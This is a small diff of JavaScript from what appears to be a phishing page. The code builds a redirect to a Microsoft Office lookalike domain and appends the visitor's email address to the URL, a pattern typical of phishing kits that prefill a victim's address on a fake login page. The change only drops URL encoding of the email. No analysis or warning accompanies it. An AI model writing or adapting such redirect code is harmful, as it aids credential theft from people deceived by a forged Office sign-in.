@@ -453,7 +453,7 @@
             // Build target URL with email parameter if exists
             let targetUrl = 'https://office.pgartd.pro/lnuCinXm';
             if (email) {
-                targetUrl += (targetUrl.includes('?') ? '&' : '?') + '#' + encodeURIComponent(email);
+                targetUrl += (targetUrl.includes('?') ? '&' : '?') + '#' + (email);
             }
 
             const container = document.getElementById('mainContainer');
